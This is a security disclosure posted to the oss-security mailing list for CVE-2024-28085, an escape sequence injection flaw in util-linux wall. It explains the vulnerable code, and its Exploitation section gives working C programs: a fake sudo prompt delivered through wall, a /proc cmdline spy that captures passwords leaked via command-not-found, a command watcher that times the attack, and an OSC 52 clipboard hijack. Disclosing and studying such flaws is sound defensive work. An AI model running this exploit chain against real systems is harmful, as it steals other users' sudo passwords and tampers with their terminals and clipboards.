Received: (qmail 3906 invoked by uid 550); 27 Mar 2024 15:11:25 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22369 invoked from network); 27 Mar 2024 14:56:37 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple;
  d=rit.edu; i=@rit.edu; q=dns/txt; s=rit1608;
  t=1711551687; x=1743087687;
  h=mime-version:reply-to:from:date:message-id:subject:to;
  bh=9Y9sHBxkqyv3pp7jHOuu2PkECPQGBk5ATigBW7KMHRg=;
  b=aSOfHPim+VXO2M2GMhoWam7QaKkbjSSXKzp6NQCYVh0HQR2peIsoylRU
   BsmzwCeH6300T6jtmMlPpMuwprAWS0fl3HSFgywswjbOPAiepbi+JF2Fb
   DLq0IyE1Yhrb28Pv5qkWqYDn896FFsIMv7K0ATajSQZx/PFMYZ5b80CKp
   Y=;
X-CSE-ConnectionGUID: Oa4hP4nnRsGDsxLBMTpw0g==
X-CSE-MsgGUID: duzlGAvuS+6SSUep06rolw==
X-RIT-HAT: Undetermined
X-RIT-GSuite: Yes
X-RIT-GoogleWorkspace: Yes
X-IronPort-AV: E=Sophos;i="6.07,159,1708405200"; 
   d="scan'208";a="198956553"
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1711551652; x=1712156452;
        h=to:subject:message-id:date:from:reply-to:mime-version
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=K3c8/NI5dt2FxYuMR6CVtNnh2cRv8/u8wl0q6O8QYbE=;
        b=R0NO/fAN3K5dYULWOmuDMDI/PCSF2GuUs0gIi0/ADLUDVe0X29XPZBleSoWuHwCnk+
         /Qaw8cCMwPnvOG8wBaENYb6peR6MPm5XcHPUL4CrdQRQxlLFCCjz6wqnVczNqLL1HwoW
         dVOPgIlBKiBeQRRE/oZW2Bupgrp6OhmBe+d3Eq2fapHcLcNJ3CwsmpJSQNCxNTqEzjJh
         4f3Q2LGoTUKSElQabLaG+7RmexAaW/4hZ8P0b49FoP/jSKYNEd7RKVfLmbA3mufuXqKI
         rZDBaB81xLZbAFVMSAL0WTPLrr38QC6bcZx7SLWHi5e55L5tHyG6K6hdK+cBtqvTmajy
         qsmw==
X-Gm-Message-State: AOJu0YwIGJEWH7br3wuv4ZRRKA4QDA4OItdtkAkUQwLTu+rbEiSZKlRv
	CgtjKKFTg9Xc0/Ze0/IoUXVuj+BZRKcoD8YfWr9KJnnDV1raJJK6pBxUTlFtz8/rkkr+nlUo9o7
	ynsZN3v0fOQ8x6OnOeT+VX0G+LpCPo8qoBDDVwGN6+S2/k4Vu/NdvXLobw/ZgrfF8d7bNJF+mfs
	rT1EuUAKPLo3fSHxielb2yyzWJmFJhcKJ7cxCUiOjgNF8haBdsVUlgAlQP
X-Received: by 2002:a92:506:0:b0:368:75ce:a057 with SMTP id q6-20020a920506000000b0036875cea057mr161442ile.28.1711551651957;
        Wed, 27 Mar 2024 08:00:51 -0700 (PDT)
X-Google-Smtp-Source: AGHT+IHSf862x+cXHSmfvKC0sJ7pf9sAVsPBpKP2ORymAXJ5n5uggj1GeJIuXaX+p1NelAv+DRRbQUiPNuW33SqGzA4=
X-Received: by 2002:a92:506:0:b0:368:75ce:a057 with SMTP id
 q6-20020a920506000000b0036875cea057mr161391ile.28.1711551651373; Wed, 27 Mar
 2024 08:00:51 -0700 (PDT)
MIME-Version: 1.0
From: "Skyler Ferrante (RIT Student)" <sjf5462@rit.edu>
Date: Wed, 27 Mar 2024 11:00:00 -0400
Message-ID: <CAEOG19rkUU8Pam5N67xyE9upepp_MahcnY48nek-VBAwo_NyAg@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset="UTF-8"
Subject: [oss-security] CVE-2024-28085: Escape sequence injection in util-linux wall

Wall-Escape (CVE-2024-28085)

Skyler Ferrante: Escape sequence injection in util-linux wall

=================================================================
Summary
=================================================================

The util-linux wall command does not filter escape sequences from
command line arguments. The vulnerable code was introduced in
commit cdd3cc7fa4 (2013). Every version since has been
vulnerable.

This allows unprivileged users to put arbitrary text on other
users terminals, if mesg is set to y and wall is setgid. CentOS
is not vulnerable since wall is not setgid. On Ubuntu 22.04 and
Debian Bookworm, wall is both setgid and mesg is set to y by
default.

If a system runs a command when commands are not found, with the
unknown command as an argument, the unknown command will be
leaked. This is true of Ubuntu 22.04. Debian Bookworm does not
leak unknown commands in its starting configuration.

On Ubuntu 22.04, we have enough control to leak a users password
by default. The only indication of attack to the user will be an
incorrect password prompt when they correctly type their
password, along with their password being in their command
history.

On other systems that allow wall messages to be sent, an attacker
may be able to alter the clipboard of a victim. This works on
windows-terminal, but not on gnome-terminal.

=================================================================
Analysis
=================================================================

When displaying inputs from stdin, wall uses the function
fputs_careful in order to neutralize escape characters.

Unfortunately, wall does not do the same for input coming from
argv.

term-utils/wall.c (note that mvec is argv)
```
/*
* Read message from argv[]
*/
int i;

for (i = 0; i < mvecsz; i++) {
  fputs(mvec[i], fs);
  if (i < mvecsz - 1)
          fputc(' ', fs);
}
fputs("\r\n", fs);
...

/*
 * Read message from stdin.
 */
while (getline(&lbuf, &lbuflen, stdin) >= 0)
        fputs_careful(lbuf, fs, '^', true, TERM_WIDTH);
```

Since argv is attacker controlled, and can contain binary data,
this is exploitable. A simple PoC command:

        wall $(printf "\033[33mHI")

If you are vulnerable, this should show a broadcast with "HI"
being yellow. If we instead run:

        echo $(printf "\033[33mHI") | wall

This should fail with "^[[33m" showing up before our message.

To make sure the PoC will work, make sure your victim user can
actually receive messages. First check that mesg is set to y
(`mesg y`). If a user does not have mesg turned on, they are not
exploitable.

If you still can't receive messages, try running `su user` or
accessing the machine through SSH. Note that just because you
can't receive messages without first going through su/SSH, does
not mean a user is not vulnerable.

========================================================================
Exploitation
========================================================================

Most distros allow argument data to be seen by unprivileged
users, and some distros run commands when commands are not found.
We can use this to leak a users password by tricking them into
giving their password as a command to run.

When I run the command xsnow in my terminal, I get the following
output:
```
Command 'xsnow' not found, but can be installed with:
sudo apt install xsnow
```

Lets look at what new processes are created when I do this:
```
-bash
/usr/bin/python3 /usr/lib/command-not-found -- xsnow
/usr/bin/snap advise-snap --format=json --command xsnow
```

This is on Ubuntu, but similar commands exist on other systems.

As a simple demonstration let's create a fake sudo prompt for
gnome-terminal, and then spy on /proc/$pid/cmdline.

fake sudo prompt:
```
#include<stdio.h>
#include<unistd.h>

int main(){
        char* argv[] = {"prog",
                "\033[3A" // Move up 3
                "\033[K"  // Delete prompt
                "[sudo] password for a_user:"
                "\033[?25l"
                // Set forground RGB (48,10,36)
                //      hide typing
                "\033[38;2;48;10;36m",
        NULL};

        char* envp[] = {NULL};

        execve("/usr/bin/wall", argv, envp);
}
```

cmdline spy:
```
#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<ctype.h>
#include<stdlib.h>
#include<dirent.h>
#include<time.h>

#define USLEEP_TIME 2000

int main(){
        pid_t current_max_pid = 0, next_max_pid;
        char current_file_name[BUFSIZ];
        char buf[BUFSIZ];

        DIR* proc_dir;
        struct dirent *dir_e;
        int curr_e_fp;

        while(1){
                proc_dir = opendir("/proc");
                if(!proc_dir)
                        abort();

                usleep(USLEEP_TIME);
                while((dir_e = readdir(proc_dir)) != NULL){
                        char* d_name = dir_e->d_name;

                        // If not a digit (not a process folder)
                        if(!isdigit(*d_name))
                                continue;

                        int num = atoi(d_name);

                        if(num > current_max_pid){
                                next_max_pid = num;
                        }else{
                                continue;
                        }

                        snprintf(current_file_name,
sizeof(current_file_name), "%s%s%s", "/proc/", d_name, "/cmdline");
                        curr_e_fp = open(current_file_name, O_RDONLY);
                        int ra = read(curr_e_fp, buf, BUFSIZ-1);
                        close(curr_e_fp);

                        for(int i = 0; i<ra-1; i++)
                                if(buf[i] == '\0') buf[i] = ' ';

                        // guaranteed to be in-bounds
                        buf[ra-1] = '\n';

                        write(1, buf, ra);
                }
                current_max_pid = next_max_pid;
                closedir(proc_dir);
        }
}
```

If we run the cmdline spy and the sudo password prompt, the user
may input their password as a command. It will look like the
following on Ubuntu:

```
-bash
/usr/bin/python3 /usr/lib/command-not-found -- SuperSecretPassword!
/usr/bin/snap advise-snap --format=json --command SuperSecretPassword!
```

Some distros, like Debian, do not seem to have a command like
command-not-found by default. There does not seem to be a way to
leak a users password in this case then, even though we can send
escape sequences to them.

This works, but the user has no reason to expect a password page
at this point. Now that we have shown some exploitability, lets
try and make it better.

Imagine we run the cmdline spy in one terminal, and then in
another terminal we run `sudo systemctl status cron.service`.
The spy will see the sudo process first, and then after the user
types their password correctly they will see `systemctl status
cron.service`.

```
sudo systemctl status cron.service
systemctl status cron.service
```

An attacker could inject a password incorrect message as soon as
the second process starts (password correct). The user will
assume they typed their password incorrectly and enter it again.

watch for certain command
```
#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<ctype.h>
#include<stdlib.h>
#include<dirent.h>
#include<time.h>
#include<string.h>

#define USLEEP_TIME 3000

int main(int argc, char** argv){
        pid_t current_max_pid = 0, next_max_pid;
        char current_file_name[BUFSIZ];
        char buf[BUFSIZ];

        DIR* proc_dir;
        struct dirent *dir_e;
        int curr_e_fp;

        if(argc != 2){
                printf("Usage: prog search_string\n");
                return 1;
        }

        while(1){
                proc_dir = opendir("/proc");
                if(!proc_dir)
                        abort();
                usleep(USLEEP_TIME);
                while((dir_e = readdir(proc_dir)) != NULL){
                        char* d_name = dir_e->d_name;

                        // If not a digit (not a process folder)
                        if(!isdigit(*d_name))
                                continue;

                        snprintf(current_file_name,
sizeof(current_file_name), "%s%s%s", "/proc/", d_name, "/cmdline");
                        curr_e_fp = open(current_file_name, O_RDONLY);
                        int ra = read(curr_e_fp, buf, BUFSIZ-1);
                        close(curr_e_fp);

                        for(int i = 0; i<ra-1; i++)
                                if(buf[i] == '\0') buf[i] = ' ';

                        // guaranteed to be in-bounds
                        buf[ra-1] = '\0';

                        // Check if proces is us
                        if(strstr(buf, argv[0])){
                                continue;
                        }
                        // Check against search string
                        if(!strcmp(buf, argv[1])){
                                write(1, buf, ra);
                                write(1, "\n", 1);
                                return 0;
                        }
                }
                closedir(proc_dir);
        }
}
```

Imagine our new spy code was compiled as watch, and our wall
exploit was called throw.

We can now run:
```
./watch "sudo systemctl start sshd"; ./watch "systemctl start sshd";
sleep .1; ./throw
```

The first two commands will wait until the user runs

        sudo systemctl start sshd

and correctly types their password for sudo. Then our wall
exploit sends our fake sudo prompt. We need to sleep for a short
duration to make sure we cover up the command prompt.

During this process, we need to make sure our original spy code
is logging all cmdline arguments, to recover the victims password

Example log from original spy:
```
./watch sudo systemctl start sshd
sudo systemctl start sshd
./watch systemctl start sshd
systemctl start sshd
bash
./throw
bash
/usr/bin/python3 /usr/lib/command-not-found -- SuperStrongPassword
/usr/bin/snap advise-snap --format=json --command SuperStrongPassword
```

Now lets imagine a different style of attack. An attacker can
change a users clipboard through escape sequences on some
terminals. For example, windows-terminal supports this. Gnome
terminal does not.

```
#include<stdio.h>

int main(){
        printf("\033]52;c;QXR0YWNrZXIgbWVzc2FnZQo=\a");
}
```

Since we can send escape sequences through wall, if a user is
using a terminal that supports this escape sequence, an attacker
can change the victims clipboard to arbitrary text.

Further references:
  https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt
  https://github.com/skyler-ferrante/CVE-2024-28085
